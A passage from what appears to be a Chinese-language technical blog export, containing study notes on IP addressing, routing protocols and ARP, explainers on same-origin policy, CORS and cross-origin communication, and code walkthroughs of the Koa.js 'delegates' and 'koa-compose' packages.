<li>虚电路服务优点是减少了分组的开销，若使用可靠传输的网络协议，就可以使得分组无差错按需到达终点；缺点是网络造价高并且不太灵活，所有数据都按相同的路由发送，中间某结点发生故障就导致整个线路中断，数据无法继续发送。</li>
<li>数据报服务优点是造价大大降低，运行方式灵活，可适应多种应用；缺点是发送的分组可能出错丢失重复和失序等，不保证交付的时限。</li>
<li>因特网采用数据报服务。</li>
</ul>
<h3 id="IP协议的用途，IP是否提供可靠的网络通讯。"><a href="#IP协议的用途，IP是否提供可靠的网络通讯。" class="headerlink" title="IP协议的用途，IP是否提供可靠的网络通讯。"></a>IP协议的用途，IP是否提供可靠的网络通讯。</h3><p>当互连在一起的计算机网络都是用相同的IP协议时，就可以使得性能各异的网络在网络层看起来好像是一个统一的网络。<br>不提供可靠的网络通讯，提供尽最大努力交付数据报服务。</p>
<h3 id="IP地址的编址方法有那三类？"><a href="#IP地址的编址方法有那三类？" class="headerlink" title="IP地址的编址方法有那三类？"></a>IP地址的编址方法有那三类？</h3><p>三个历史阶段</p>
<ol>
<li>分类的IP地址：最基本的编址方法</li>
<li>子网的划分：对最基本的编址方法的改进</li>
<li>构成超网：比较新的无分类编址方法</li>
</ol>
<h3 id="三种编址模式下，IP地址的格式特点。"><a href="#三种编址模式下，IP地址的格式特点。" class="headerlink" title="三种编址模式下，IP地址的格式特点。"></a>三种编址模式下，IP地址的格式特点。</h3><p>1）分类的IP地址：两级地址。IP地址::={ &lt;网络号&gt;, &lt;主机号&gt;}<br>2）子网的划分：三级地址。IP地址::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}<br>3）构成超网：无分类两级地址。IP地址::= {&lt;网络前缀&gt;, &lt;主机号&gt;}</p>
<h3 id="会正确计算三种编址方法下，一个IP网络的有效地址范围。"><a href="#会正确计算三种编址方法下，一个IP网络的有效地址范围。" class="headerlink" title="会正确计算三种编址方法下，一个IP网络的有效地址范围。"></a>会正确计算三种编址方法下，一个IP网络的有效地址范围。</h3><p>具体做法可以看书上例题，需要注意的是全0和全1的主机无效。</p>
<h3 id="掌握三种编址方法下，路由器的分组转发的流程。"><a href="#掌握三种编址方法下，路由器的分组转发的流程。" class="headerlink" title="掌握三种编址方法下，路由器的分组转发的流程。"></a>掌握三种编址方法下，路由器的分组转发的流程。</h3><p>分类的IP地址：(1) 从数据报的首部提取目的主机的IP地址D, 得出目的网络地址为N。<br>(2) 若网络N 与此路由器直接相连，则把数据报直接交付目的主机D；否则是间接交付，执行(3)。<br>(3) 若路由表中有目的地址为D 的特定主机路由，则把数据报传送给路由表中所指明的下一跳路由器；否则，执行(4)。<br>(4) 若路由表中有到达网络N的路由，则把数据报传送给路由表指明的下一跳路由器；否则，执行(5)。<br>(5) 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；否则，执行(6)。<br>(6) 报告转发分组出错。</p>
<p>划分子网时：<br>(1) 从收到的分组的首部提取目的IP地址D。<br>(2) 先用各网络的子网掩码和D 逐位相“与”，看是否和相应的网络地址匹配。若匹配，则将分组直接交付。否则就是间接交付，执行(3)。<br>(3) 若路由表中有目的地址为D的特定主机路由，则将 分组传送给指明的下一跳路由器；否则，执行(4)。<br>(4) 对路由表中的每一行的子网掩码和D逐位相“与”， 若其结果N与该行的目的网络地址匹配，则将分组传送给该行指明的下一跳路由器；否则，执行(5)。<br>(5) 若路由表中有一个默认路由，则将分组传送给路由表中所指明的默认路由器；否则，执行(6)。<br>(6) 报告转发分组出错。</p>
<p>构成超网时：仍采用分组转发算法，只是在查找路由表时使用最长前缀匹配或二叉线索法。</p>
<h3 id="ARP的工作原理，路由器是如何确定下一站的物理地址的？"><a href="#ARP的工作原理，路由器是如何确定下一站的物理地址的？" class="headerlink" title="ARP的工作原理，路由器是如何确定下一站的物理地址的？"></a>ARP的工作原理，路由器是如何确定下一站的物理地址的？</h3><ul>
<li><strong>工作原理</strong>：每一个主机都设有一个ARP高速缓存(ARP cache)，里面有所在的局域网上的各主机和路由器的IP地址到硬件地址的映射表。当主机A欲向本局域网上的某个主机B发送IP数据报时，就先在其ARP高速缓存中查看有无主机B的IP地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入MAC帧，然后通过局域网将该MAC帧发往此硬件地址。当路由器或主机查不到B的IP地址时，A就自动运行ARP，ARP进程通过在本局域网上发送ARP请求分组广播并接收B返回的ARP响应分组，再在A的ARP高速缓存中写入B的IP地址到硬件地址的映射（此时B也会在自己的ARP高速缓存中写入A的地址映射）。另外，高速缓存中的每一个映射项目都设置有生存时间。</li>
<li><strong>路由器确定物理地址</strong>：路由器收到某主机发送过来的IP数据报后，就从转发表中找出下一跳的路由器，同时使用ARP解析出下一跳路由器的硬件地址，也就是下一站的物理地址。</li>
</ul>
<h3 id="IP数据报的格式。IP分段（或分片）与重组。分片与重组发生的位置？"><a href="#IP数据报的格式。IP分段（或分片）与重组。分片与重组发生的位置？" class="headerlink" title="IP数据报的格式。IP分段（或分片）与重组。分片与重组发生的位置？"></a>IP数据报的格式。IP分段（或分片）与重组。分片与重组发生的位置？</h3><p><img src="https://github.com/CyC2018/Interview-Notebook/blob/master/pics/85c05fb1-5546-4c50-9221-21f231cdc8c5.jpg" alt="IP数据报"><br>一个IP数据报由首部和数据两部分组成。首部的前一部分是固定长度，共20 字节，是所有IP 数据报必须具有的。在首部的固定部分的后面是一些可选字段，其长度是可变的。</p>
<p>当数据报的长度超过网络所允许的最大传送单元MTU时，需对数据报进行分片后再传输，每个分片的长度是8字节的整数倍。</p>
<p>分片的位置通过片偏移来体现，表现了某片在原分组的相对位置。</p>
<h3 id="RIP中“距离”的含义是什么？RIP的工作原理。"><a href="#RIP中“距离”的含义是什么？RIP的工作原理。" class="headerlink" title="RIP中“距离”的含义是什么？RIP的工作原理。"></a>RIP中“距离”的含义是什么？RIP的工作原理。</h3><ul>
<li><p><strong>距离</strong>：RIP中对距离的定义是从一路由器到直接相连的网络的距离定义为1，到非直接相连的网络的距离定义为经过的路由器数加一。</p>
</li>
<li><p><strong>原理</strong>：路由器在刚开始工作时，路由表是空的，然后路由器就得出到直接相连的几个网络的距离。接着每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。但经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳的路由器的地址。</p>
</li>
</ul>
<h3 id="OSPF中“链路状态”的含义是什么。OSPF的工作原理。"><a href="#OSPF中“链路状态”的含义是什么。OSPF的工作原理。" class="headerlink" title="OSPF中“链路状态”的含义是什么。OSPF的工作原理。"></a>OSPF中“链路状态”的含义是什么。OSPF的工作原理。</h3><ul>
<li><strong>链路状态</strong>：所谓链路状态就是说明本路由器都和哪些路由器相邻，以及该链路的度量（metric），度量也可以理解为代价。</li>
</ul>
<h3 id="路由器的结构及工作原理。"><a href="#路由器的结构及工作原理。" class="headerlink" title="路由器的结构及工作原理。"></a>路由器的结构及工作原理。</h3><p>结构上划分为路由选择部分和分组转发部分。</p>
<h3 id="什么是自治系统AS？域内路由选择与域间路由选择有何应用区别？给有哪些代表协议？"><a href="#什么是自治系统AS？域内路由选择与域间路由选择有何应用区别？给有哪些代表协议？" class="headerlink" title="什么是自治系统AS？域内路由选择与域间路由选择有何应用区别？给有哪些代表协议？"></a>什么是自治系统AS？域内路由选择与域间路由选择有何应用区别？给有哪些代表协议？</h3><ul>
<li><p><strong>AS</strong>:自治系统是在单一技术管理下的一组路由器，这些路由器使用一种自治系统内部的路由选择协议和共同的度量。</p>
</li>
<li><p><strong>区别</strong>：域内路由选择是在自治系统内部的路由选择，与互联网其他自治系统使用什么路由选择协议无关，常用RIP和OSPF协议；域间路由选择是自治系统之间的路由选择，当源主机和目的主机不在同一个自治系统时，当数据报传送到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中，常用BGP协议。</p>
</li>
</ul>
<h3 id="路由选择协议与路由转发策略是否是一回事？路由器中路由表与转发表的区别？"><a href="#路由选择协议与路由转发策略是否是一回事？路由器中路由表与转发表的区别？" class="headerlink" title="路由选择协议与路由转发策略是否是一回事？路由器中路由表与转发表的区别？"></a>路由选择协议与路由转发策略是否是一回事？路由器中路由表与转发表的区别？</h3><ul>
<li><p>路由选择协议解决的是如何获得路由表中的路由信息，指的是路由选择策略,路由选择涉及多个路由器。<br>路由转发策略指路由器根据转发表将用户的 IP 数据报从合适的端口转发出去,涉及一个路由器。</p>
</li>
<li><p>区别：1）路由表一般包含从目的地址到下一跳的映射；转发表必须包含完成转发功能的所必需的信息。<br>2）路由表是根据路由选择算法得出的。而转发表是从路由表得出的。<br>3）路由表和转发表应采用不同的数据结构。路由表需要对网络拓扑变化的计算最优化，而转发表应当使得查找过程最优化。<br>4）路由表总是通过软件来实现，而转发表可用特殊的硬件实现。</p>
</li>
</ul>
<hr>
<p>2018 年 5月 5日</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>跨域简述</title>
    <url>/2019/03/04/%E8%B7%A8%E5%9F%9F%E7%AE%80%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="同源策略与跨域"><a href="#同源策略与跨域" class="headerlink" title="同源策略与跨域"></a>同源策略与跨域</h1><p>同源策略是一种限制来自于一个源的脚本和文档如何与另一个源的资源进行交互。</p>
<a id="more"></a>

<h2 id="跨域网络请求"><a href="#跨域网络请求" class="headerlink" title="跨域网络请求"></a>跨域网络请求</h2><p>跨域控制两个不同源之间的交互，这些交互分为以下三类：</p>
<ul>
<li>跨域写通常允许。如链接，重定向和表单提交。一些HTTP请求需要预检(preflight)，预检请求首先通过OPTIONS方法发送一个HTTP请求到其他域的资源，为了确定实际的请求是否可以安全发送。</li>
<li>跨域嵌入（embedding）通常允许</li>
<li>跨域读通常不允许</li>
</ul>
<p>跨域嵌入允许如下的资源嵌入：</p>
<ul>
<li>script标签，只有同源的语法错误才可以显示</li>
<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>标签</li>
<li>img标签</li>
<li>video或者audio</li>
<li>@font-face字体。一些浏览器允许跨域字体</li>
<li>frame和iframe标签内容，可以使用X-Frame-Options头阻止跨域framing</li>
</ul>
<h2 id="如何实现跨域请求"><a href="#如何实现跨域请求" class="headerlink" title="如何实现跨域请求"></a>如何实现跨域请求</h2><p>使用CORS来允许跨域请求。CORS是HTTP的一部分用于让服务器指定哪一个主机被许可从服务器加载内容。</p>
<p>插个题外话，HTTP头中的Host字段，Origin字段以及Referer字段很类似，要做好区分。</p>
<ul>
<li>Host字段指明服务器域名（对于虚拟主机），和一个可选的端口号。</li>
<li>Origin字段说明请求从哪里发起，包括协议和主机名，端口可选，类似于Referer，但不包含完整路径信息。常用于CORS.</li>
<li>Referer告知服务器请求从哪个页面来的，url段也就是#以及用户信息<code>username:password</code>不包含在其中，可用于日志分析，访客识别等。也可用于csrf的防治。</li>
</ul>
<p>通过设置access-control-allow-origin来实现跨域请求，值如果为*表示任意域都可以请求。我们也可以在服务端设置一个origin数组来表示我们允许访问我们服务器特定资源的域。express种cors中间件就是用于设置该行为的。</p>
<p>对于跨域请求，分为简单请求和复杂请求，简单请求有以下几种：</p>
<ul>
<li>使用GET,POST,HEAD方法。</li>
<li>Content-Type为以下三种，application/x-www-form-urlencoded，text/plain，multipart/form-data</li>
</ul>
<p>不符合的一般就是复杂请求，复杂请求的CORS请求，在正是请求之前，会preflight也就是发起预检请求，该请求方法为OPTION，服务端来根据请求头内容来授予相应访问权限。这些逻辑都可以在后端进行控制，如使用cors中间件函数。</p>
]]></content>
      <tags>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>通信相关</title>
    <url>/2018/01/09/%E9%80%9A%E4%BF%A1%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>同源策略限制从一个源（协议，域名和端口（端口默认为80））加载的文档或脚本如何与来自于另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的安全机制。</p>
<p>那么具体有什么限制呢？</p>
<ul>
<li>Cookie、LocalStorage和IndexDB无法读取</li>
<li>DOM无法获得</li>
<li>AJAX请求不能发送</li>
</ul>
<a id="more"></a>


<h3 id="前后端通信的方法"><a href="#前后端通信的方法" class="headerlink" title="前后端通信的方法"></a>前后端通信的方法</h3><ul>
<li>Ajax（必须同源）</li>
<li>WebSocket（不限制同源策略）</li>
<li>CORS（支持跨域也支持同源）</li>
</ul>
<hr>
<h3 id="如何创建Ajax"><a href="#如何创建Ajax" class="headerlink" title="如何创建Ajax"></a>如何创建Ajax</h3><p>注意几点</p>
<ul>
<li>XMLHttpRequest对象的工作流程</li>
<li>兼容性的一些处理</li>
<li>事件触发顺序</li>
<li>事件触发条件</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlhttp = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 创建xhr对象，保证兼容性</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">  xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHTTP)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (xmlhttp != null) &#123;</span></span><br><span class="line"><span class="string">  xmlhttp.open('</span>GET<span class="string">','</span>/example/note.html,<span class="literal">true</span>);</span><br><span class="line">  xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState === <span class="number">4</span> &amp;&amp; xmlhttp.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> resText = xmlhttp.responseText;</span><br><span class="line">      <span class="built_in">console</span>.log(resText);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(<span class="string">'Your browser does not support AJAX);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  //发送get请求括号内没有参数，post请求则需要将body作为参数传入</span></span><br><span class="line"><span class="string">  xmlhttp.send(null);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="跨域通信的方式"><a href="#跨域通信的方式" class="headerlink" title="跨域通信的方式"></a>跨域通信的方式</h3><ul>
<li>JSONP<br>出现CORS之前，一直使用JSONP，原理是通过动态向客户端添加一个script元素，向服务器请求数据，在请求的url中添加serach字段，指定回调函数名字，服务器收到请求后，会将数据放在指定名字的回调中传回来。</li>
<li>Hash（#后面的东西，改变不刷新页面）<br>原理是hash后面的东西改变不刷新页面，主要用在内嵌iframe的父子窗口之间的通信</li>
<li>postMessage（h5新增）<br>创建目标窗口的window对象，然后通过该对象的postMessgae方法传递数据，最后目标窗口通过监听message事件接收数据。</li>
<li>WebSocket<br>初始化websocket对象，设置监听事件，onopen，onmessage和onclose事件。</li>
<li>CORS（变种的Ajax，加一个origin头允许通信，需要服务器的配置，通过认知发送请求来的头部的origin）<br>fetch的api</li>
</ul>
<hr>
<p>2018 年 1月 9日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>阅读delegates源码</title>
    <url>/2019/02/14/%E9%98%85%E8%AF%BBdelegates%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<h1 id="delegates"><a href="#delegates" class="headerlink" title="delegates"></a>delegates</h1><p>因为Koa.js在将request对象和response对象的属性委托到context对象时，依赖了delegates包，我们就来分析一下这个包</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = Delegator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize a delegator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> <span class="variable">proto</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;String&#125;</span> <span class="variable">target</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api <span class="variable">public</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delegator</span>(<span class="params">proto, target</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 只有在new Delefator的时候this才会指向新创建的对象</span></span><br><span class="line">  <span class="comment">// 若不是以new方式创建对象，则返回一个新的delegator实例</span></span><br><span class="line">  <span class="comment">// 接着就继续执行构造函数</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="keyword">this</span> <span class="keyword">instanceof</span> Delegator)) <span class="keyword">return</span> <span class="keyword">new</span> Delegator(proto, target);</span><br><span class="line">  <span class="keyword">this</span>.proto = proto;</span><br><span class="line">  <span class="keyword">this</span>.target = target;</span><br><span class="line">  <span class="keyword">this</span>.methods = [];</span><br><span class="line">  <span class="keyword">this</span>.getters = [];</span><br><span class="line">  <span class="keyword">this</span>.setters = [];</span><br><span class="line">  <span class="keyword">this</span>.fluents = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delegates包对外暴露一个函数，其本质为一个构造函数，作用也是作为类存在的，我们通过暴露的构造函数可以实例化一个delegator。Koa.js中在context.js文件中利用了delegates将context对象上的某些getter，setter和方法委托给了context.request以及context.response对象。</p>
<a id="more"></a>

<h2 id="method方法"><a href="#method方法" class="headerlink" title="method方法"></a>method方法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Delegate method `name`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;String&#125;</span> <span class="variable">name</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;Delegator&#125;</span> <span class="variable">self</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api <span class="variable">public</span></span></span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"></span><br><span class="line">Delegator.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> proto = <span class="keyword">this</span>.proto;</span><br><span class="line">  <span class="keyword">var</span> target = <span class="keyword">this</span>.target;</span><br><span class="line">  <span class="keyword">this</span>.methods.push(name);</span><br><span class="line"></span><br><span class="line">  proto[name] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>[target][name].apply(<span class="keyword">this</span>[target], <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>注意到delegator实例的每个方法都返回了this，意味着可以以链式调用的方法调用delegator实例的相关方法。</strong></p>
<p>method方法的重点在第四句，我们在将proto对象的name属性定义为一个函数，而该函数的调用会被委托给proto对象的target属性上的name属性。这里可能会比较绕，但其实不难，问题就在于我们要理解函数中的this指向的问题。前面三行的this指向的是当前的delegator实例，而我们在proto对象上定义name属性时，后面这个函数中的this和delegator实例就没有什么关系了。因为这个函数中的this的含义取决于这个函数是如何调用的。</p>
<p>联想到Koa中我们可以直接使用类似<code>ctx.body</code>或者<code>ctx.body=</code>或者<code>ctx.redirect()</code>这样的形式。其实这里并不是因为ctx对象本身就有body getter和setter或者有redirect这样的方法，而是因为我们在context.js文件中进行了对应request对象和response对象上面的getter和setter方法委托。</p>
<p>我们首先要理解proto[name]之后的函数是怎么调用的，才能知道它的this指向，我们在实际调用时是通过proto这个对象对它的name属性进行方法调用，对应于koa中就是ctx这个对象，那么函数体中的this就自然指向了ctx对象，我们函数体的意图就是找到ctx的target上面的name属性，来调用它的方法并返回它执行的结果。这里我们还利用了apply来对所调用方法中this的设置，将其中的this设置为了对应的target对象。</p>
<p>理解了method方法，后面的其他方面就是一个道理了。简单说来，就是我们首先要在proto这个对象上先设置一个对应名字的方法或者getter和setter，然后在这个函数体中，我们去调用代理对象的相关方法或者getter和setter。</p>
<h2 id="getter，setter和access方法"><a href="#getter，setter和access方法" class="headerlink" title="getter，setter和access方法"></a>getter，setter和access方法</h2><p>这三个方法相互关联，放在一起分析。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Delegator.prototype.getter = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> proto = <span class="keyword">this</span>.proto;</span><br><span class="line">  <span class="keyword">var</span> target = <span class="keyword">this</span>.target;</span><br><span class="line">  <span class="keyword">this</span>.getters.push(name);</span><br><span class="line"></span><br><span class="line">  proto.__defineGetter__(name, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>[target][name];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Delegator.prototype.setter = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> proto = <span class="keyword">this</span>.proto;</span><br><span class="line">  <span class="keyword">var</span> target = <span class="keyword">this</span>.target;</span><br><span class="line">  <span class="keyword">this</span>.setters.push(name);</span><br><span class="line"></span><br><span class="line">  proto.__defineSetter__(name, <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>[target][name] = val;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Delegator.prototype.access = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.getter(name).setter(name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>__defineSetter__</code>和<code>__defineGetter</code>是已经不被推荐的设置对象中get和set方法的一种遗留方式。我们在proto对象上这次定义get和set方法，而在对应的get和set方法里，我们通过get属性和set属性调用对应的代理对象的get或者set方法。</p>
<p>而access则是既代理getter方法又代理setter方法。</p>
<h2 id="fluent方法"><a href="#fluent方法" class="headerlink" title="fluent方法"></a>fluent方法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Delegator.prototype.fluent = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> proto = <span class="keyword">this</span>.proto;</span><br><span class="line">  <span class="keyword">var</span> target = <span class="keyword">this</span>.target;</span><br><span class="line">  <span class="keyword">this</span>.fluents.push(name);</span><br><span class="line"></span><br><span class="line">  proto[name] = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'undefined'</span> != <span class="keyword">typeof</span> val) &#123;</span><br><span class="line">      <span class="keyword">this</span>[target][name] = val;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>[target][name];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>和method类似，依然是在proto对象上设置name属性为一个方法，如果我们调用该方法时没有传入参数，则返回代理对象上的对应属性，如果传入了参数，则将代理对象的对应属性设置为传入的值。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Koa.js</tag>
      </tags>
  </entry>
  <entry>
    <title>阅读koa-compose源码</title>
    <url>/2019/02/15/%E9%98%85%E8%AF%BBkoacompose%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<h1 id="koa-compose"><a href="#koa-compose" class="headerlink" title="koa-compose"></a>koa-compose</h1><p>要深入理解koa中的中间件的运行机制，必须要明白的是koa-compose这个包究竟做了些什么。koa-compose包接收一个数组，返回一个compose之后的函数，并且返回的函数接收一个ctx对象和next函数参数，并最终返回一个promise。理解koa-compose需要首先掌握递归概念以及ES6的promise和generator函数以及async/await等特性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span> (<span class="params">middleware</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(middleware)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Middleware stack must be an array!'</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> fn <span class="keyword">of</span> middleware) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">'function'</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Middleware must be composed of functions!'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> <span class="variable">context</span></span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return <span class="type">&#123;Promise&#125;</span></span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@api <span class="variable">public</span></span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">context, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// last called middleware #</span></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> dispatch(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt;= index) <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'next() called multiple times'</span>))</span><br><span class="line">      index = i</span><br><span class="line">      <span class="keyword">let</span> fn = middleware[i]</span><br><span class="line">      <span class="keyword">if</span> (i === middleware.length) fn = next</span><br><span class="line">      <span class="keyword">if</span> (!fn) <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve()</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(fn(context, dispatch.bind(<span class="literal">null</span>, i + <span class="number">1</span>)));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>compose这个函数在koa中是在handleRequest函数调用时传入的，在handleRequest的函数体中，调用了compose生成的结果函数fnMiddleware并且传入了合成的ctx对象，至此compose返回的函数的生命周期开始。我们进入到compose的函数体中，也就是下面这一段。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">context, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// last called middleware #</span></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> dispatch(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt;= index) <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'next() called multiple times'</span>))</span><br><span class="line">      index = i</span><br><span class="line">      <span class="keyword">let</span> fn = middleware[i]</span><br><span class="line">      <span class="keyword">if</span> (i === middleware.length) fn = next</span><br><span class="line">      <span class="keyword">if</span> (!fn) <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve()</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(fn(context, dispatch.bind(<span class="literal">null</span>, i + <span class="number">1</span>)));</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>首先context为application中createContext函数返回的context对象，而next最初为undefined。</p>
<p>中间件序号从0开始，将index首先设置为-1，表明上次调用的中间件的序号为-1，也就是代表程序初始状态。此时返回dispatch(0)。于是我们开始调用dispatch函数并且该函数最终返回一个promise。</p>
